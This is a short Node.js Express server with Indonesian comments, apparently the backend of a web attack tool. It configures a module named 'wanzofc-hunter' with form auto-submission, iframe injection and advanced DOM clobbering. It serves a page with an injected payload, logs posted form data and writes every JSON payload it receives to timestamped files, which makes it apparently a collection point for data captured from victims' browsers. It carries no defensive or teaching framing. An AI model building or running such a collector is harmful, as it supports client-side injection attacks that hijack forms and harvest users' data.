const express = require('express');
const wanzofc = require('wanzofc-hunter');
const path = require('path');
const fs = require('fs');
const app = express();
wanzofc.configure({
    callbackURL: null, // Callback URL dikosongkan, diisi di client-side
    autoSubmitForms: true,
    iframeInjection: true,
   // iframeURL: null, // iframe URL dikosongkan, diisi di client-side
    chaosMode: true,
    domClobbering: true,
    domClobberingLevel: 'advanced'
});

app.use(express.urlencoded({ extended: true }));
app.get('/', (req, res) => {
    const filePath = path.join(__dirname, 'index.html');
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error("Gagal membaca file:", err);
            return res.status(500).send('Internal Server Error');
        }
    const defaultPayload = 'svg';
    const defaultIframeURL = 'about:blank';
        const modifiedData = data
        .replace('{{PAYLOAD_INPUT}}', defaultPayload)
        .replace('{{IFRAME_URL_INPUT}}', defaultIframeURL);
        res.send(modifiedData);
    });
});

app.post('/form-submission', (req, res) => {
    console.log('Data formulir:', req.body);
    res.send('Data diterima!');
});
app.post('/payload', express.json(), (req, res) => {
    console.log('Payload diterima:', req.body);

            // Simpan payload ke file
            const timestamp = Date.now();
            const filename = `payload-${timestamp}.json`;
            fs.writeFile(filename, JSON.stringify(req.body, null, 2), err => {
             if (err) {
                console.error('Gagal menyimpan payload:', err);
                 res.status(500).send('Internal Server Error');
              } else {
               console.log(`Payload disimpan ke ${filename}`);
                res.send('Payload diterima!');
               }
             });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server berjalan di: http://localhost:${port}`);
});